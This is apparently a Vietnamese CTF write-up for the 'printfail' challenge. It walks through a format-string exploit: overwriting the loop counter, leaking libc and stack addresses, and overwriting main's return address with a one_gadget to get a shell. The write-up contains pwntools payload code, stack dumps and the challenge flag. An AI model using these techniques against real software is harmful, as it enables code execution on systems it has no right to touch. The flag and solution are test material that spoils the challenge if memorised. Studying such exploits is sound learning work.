# printfail

## IDA

```c
int __fastcall run_round(_DWORD *a1)
{
  memset(buf, 0, sizeof(buf));
  fflush(stdout);
  if ( !fgets(buf, 512, stdin) )
    return 0;
  *a1 = strlen(buf) <= 1;
  return printf(buf);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  puts("I'll let you make one printf call. You control the format string. No do-overs.");
  v4 = 1;
  while ( v4 )
  {
    if ( !(unsigned int)run_round(&v4) )
      return 0;
    if ( v4 )
      puts("...That was an empty string. Come on, you've at least gotta try!\nOkay, I'll give you another chance.");
  }
  return 0;
}
```

## Định hướng

Em được hint là ow giá trị v4 của while để ta có thể đưa nhiều payload của mình vào.
Đầu tiên em thấy khi nhập giá trị ở hàm fgets và kiểm tra stack, em thấy dữ liệu nhập vào không lưu trong stack:

```c
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555259 → run_round()
[#1] 0x5555555552d0 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x007fffffffdc80│+0x0000: 0x007fffffffddc8  →  0x007fffffffe064  →  "/mnt/d/ctf/utctf/printfail"         ← $rsp
0x007fffffffdc88│+0x0008: 0x007fffffffdca4  →  0x6305730000000001
0x007fffffffdc90│+0x0010: 0x007fffffffdcb0  →  0x0000000000000001        ← $rbp
0x007fffffffdc98│+0x0018: 0x005555555552d0  →  <main+60> test eax, eax
0x007fffffffdca0│+0x0020: 0x0000000100001000
0x007fffffffdca8│+0x0028: 0x6890f61163057300
0x007fffffffdcb0│+0x0030: 0x0000000000000001
0x007fffffffdcb8│+0x0038: 0x007ffff7db5d90  →  <__libc_start_call_main+128> mov edi, eax
0x007fffffffdcc0│+0x0040: 0x0000000000000000
0x007fffffffdcc8│+0x0048: 0x00555555555294  →  <main+0> endbr64
```

Đến đây em khá bí và xin hint thì được hint là tìm cách thay đổi ret của hàm main là `c 0x007fffffffdcb8│+0x0038: 0x007ffff7db5d90  →  <__libc_start_call_main+128> mov edi, eax`
Em nghĩ là mình sẽ tìm địa chỉ stack nào đó có trỏ đến địa chỉ ret để thay đổi thành one_gadget.
Em tiếp tục tìm nhưng vẫn chưa thấy địa chỉ nào trỏ trực tiếp đến ret
Bí quá em xin hint và coi lại video 20 thì em thấy ở đây, có thể sử dụng để khai thác:

```c
0x007fffffffdc80│+0x0000: 0x007fffffffddc8  →  0x007fffffffe064  →  "/mnt/d/ctf/utctf/printfail" ,    ← $rsp  //here
0x007fffffffdc88│+0x0008: 0x007fffffffdca4  →  0x6305730000000001
0x007fffffffdc90│+0x0010: 0x007fffffffdcb0  →  0x0000000000000001        ← $rbp
```

thì các bước em khai thác như sau:

- dùng %n trỏ đến vị trí thứ 6, và ghi đè `0x007fffffffe064` thành `0x007fffffffdcb8` , khi đó tại `0x007fffffffddc8` ta có:

```c
0x007fffffffddc8 : 0x007fffffffdcb8  →  0x007ffff7db5d90  →  <__libc_start_call_main+128> mov edi, eax
```

- dùng %n trỏ đến vị trí thứ 43 đổi `0x007fffffffdcb8  →  0x007ffff7db5d90` thành one_gadget. okela

---

# Thực thi

### Bước 1: ta sẽ tính toán để thay đổi v4, nên là em sẽ ghi 8 vào vị trí thứ 7 là đã thay đổi giá trị v4

![image](https://user-images.githubusercontent.com/111769169/224769758-d9f5f842-851b-479b-83e9-839ed89051a3.png)

### Bước 2: do file ko có hàm system nên ta sẽ phải leak libc.

Ta nên chọn vị trí 13 để leak vì nó là save rip của main và theo video 20 chú thích thì save rip nó tỉ lệ đúng hơn vì leak những thằng sau, khi chạy server nó là địa chỉ rác.

```python
    # %8c%7$n là để thoả điều kiện chạy loop để có thể input nhiều lần, nó đọc 8 kí tự từ %c và ghi vào v4
    r.sendlineafter(b"do-overs.\n", b"%8c%7$n %13$p")
```

chạy trên sever:

```
       8 0x7efc43df0083
...That was an empty string. Come on, you've at least gotta try!
Okay, I'll give you another chance.
```

tìm libc:
![image](https://user-images.githubusercontent.com/111769169/224772318-13002d7a-d83f-4579-814f-7ee6825d9e21.png)

pwnint và kiểm tra stack:
![image](https://user-images.githubusercontent.com/111769169/224772964-b9946161-9c43-4c3d-a25c-fecd95a5ec87.png)

đúng rồi =)), đợt em làm leak sai libc ngồi cả ngày mới biết sai libc nên cú lắm, phải cẩn thận mới được :)))

tính offset và viết script:

```python
    r = conn()
    input()
    r.sendlineafter(b"do-overs.\n", b"%8c%7$n %13$p")
    r.recvuntil(b"0x")
    leak = int(b"0x" + r.recvline(keepends=False), 16)
    libc.address = leak - 147587
    log.info("leak libc: " + hex(leak))
    log.info("leak base: " + hex(libc.address))
```

### Bước 3: leak ret

Do địa chỉ động nên ta cần leak địa chỉ ret, để bước sau ta sẽ ghi đè
Ở đây em sẽ leak địa chỉ này và tính offset của nó với ret là 8

![image](https://user-images.githubusercontent.com/111769169/224774432-dadd1ea0-ecdc-4c1c-8e15-37c222541500.png)

```python3
    payload = b"%8c%7$n %8$p"
    r.sendlineafter(b'chance.\n', payload)
    r.recvuntil(b"       8 ")
    leak = int(r.recvline(keepends=False), 16)
    ret = leak + 8
    log.info("ret: " + hex(ret & 0xffff))
```

### Bước 4: ghi đè

ta kiểm tra stack lại ta thấy địa chỉ mà lúc địa hướng (ở vị trí 6) và sau khi patched (ở vị trí 15)
em sẽ trỏ đến vị trí 15 (màu đỏ) và ghi đè giá trị nó trỏ đến thành địa chỉ ret (màu xanh)

```python
    payload = f"%8c%7$n%{ret & 0xffff}c%15$hn".encode()
    r.sendlineafter(b'chance.\n', payload)
```

thì thấy ta stack lúc này

```c
0x007ffc699248f8│+0x0038: 0x007fc7b9614083  →  <__libc_start_main+243> mov edi, eax
0x007ffc69924900│+0x0040: 0x007fc7b9811620  →  0x00050f5a00000000
0x007ffc69924908│+0x0048: 0x007ffc699249e8  →  0x007ffc69924900
```

hmm, có vẻ do `%8c%7$n` làm lệch đi 0x8, do đó ta - 8, nên em chỉnh lại script

```python
    payload = f"%8c%7$n%{ret - 8 & 0xffff}c%15$hn".encode()
    r.sendlineafter(b'chance.\n', payload)
```

```
0x007ffeea1d1588│+0x0038: 0x007f15ffc7a083  →  <__libc_start_main+243> mov edi, eax
0x007ffeea1d1590│+0x0040: 0x007f15ffe77620  →  0x00050f5a00000000
0x007ffeea1d1598│+0x0048: 0x007ffeea1d1678  →  0x007ffeea1d1588  →  0x007f15ffc7a083  →  <__libc_start_main+243> mov edi, eax
```

oke ổn

### Bước 5: thay đổi ret

ở đây ta chú ý

```
0x007ffeea1d1598│+0x0048: 0x007ffeea1d1678  →  0x007ffeea1d1588  →  0x007f15ffc7a083  →  <__libc_start_main+243> mov edi, eax
```

nghĩa là tại 1598 chứa địa chỉ 1678 do đó ta sẽ tìm đến `0x007ffeea1d1678`
khi đó `0x007ffeea1d1678: 0x007ffeea1d1588  →  0x007f15ffc7a083` và bắt đầu ghi đè ret thành one_gadget

đây ta thấy ở vị trí 43 có chứa địa chỉ trỏ đến ret `0x007ffc26014868│+0x0128: 0x007ffc26014778  →  0x007f0803924083  →  <__libc_start_main+243> mov edi, eax`

#### Bước 5.1: lấy one_gadget, chia gadget

ở đây ta sử dụng one_gadget để tạo shell, và kiểm tra các thanh ghi lúc ret của main

![image](https://user-images.githubusercontent.com/111769169/224783130-05bc88bb-16d8-4227-a3e3-7afcfd5e70b8.png)
![image](https://user-images.githubusercontent.com/111769169/224783460-37b8c58f-9035-4018-bd1d-98b397c3bd69.png)

vì thanh ghi r15 = rdx = 0 nên ta lấy gadget thứ 2
do là địa chỉ có 6byte nên để ghi hết cả 6byte thì máy tính chịu =)), do đó ta sẽ chia ghi nhiều lần.
có thể ghi 3 lần 2byte, ở đây e thử ghi 2 lần 3byte, do ghi 1 lần 3 byte có trường hợp nhiều quá nên có thể lỗi.

em gadget ra là 2:

```python
    one_gadget = libc.address + 0xe3b04
    part1 = one_gadget & 0xffffff               #lấy 3byte
    part2 = (one_gadget >> 8*3) & 0xffffff      # dịch bit 3 byte và lấy phần còn lại
```

#### Bước 5.2: gửi part 1 và part 2:

ghi 3byte vào vị trí 43

```python
    log.info("one_gadget 1: " + hex(part1))
    log.info("one_gadget 2: " + hex(part2))

    payload1 = f"%8c%7$n%{part1 - 8}c%43$n".encode()
    r.sendlineafter(b'chance.\n', payload1)
```

kiểm tra

```c
0x007fff72dbb4c0│+0x0120: 0x0000000000000001     ← $r13
0x007fff72dbb4c8│+0x0128: 0x007fff72dbb3d8  →  0x00007f2b00f9cb04
```

có vẻ nó đã ghi được 3byte rồi

tiếp đến ghi part 2
do đã ghi 3 byte rồi nên ta sẽ phải + 3 vào địa chỉ ret

```python
    payload = f"%8c%7$n%{(ret +3) & 0xffff - 8}c%15$hn".encode()
    r.sendlineafter(b'chance.\n', payload)
```

kiểm tra

```
0x00007ff900e2ab04 : lúc ghi 3byte part 1
0xf6862000007ff900 : lúc thay đổi
```

cuối cùng là ghi part 2 thoi

```python
    payload = f"%{part2}c%43$n".encode()
    r.sendlineafter(b'chance.\n', payload)
```

![image](https://user-images.githubusercontent.com/111769169/224789015-730b536e-e678-4bfd-a6c5-8007a8a93f91.png)

yeah, nó đã bắt đầu thực thi shell, và đã đúng =)))

![image](https://user-images.githubusercontent.com/111769169/224789257-27e2df2e-e461-4e48-8025-b3213f59b95f.png)

```python
# utflag{one_printf_to_rule_them_all}
```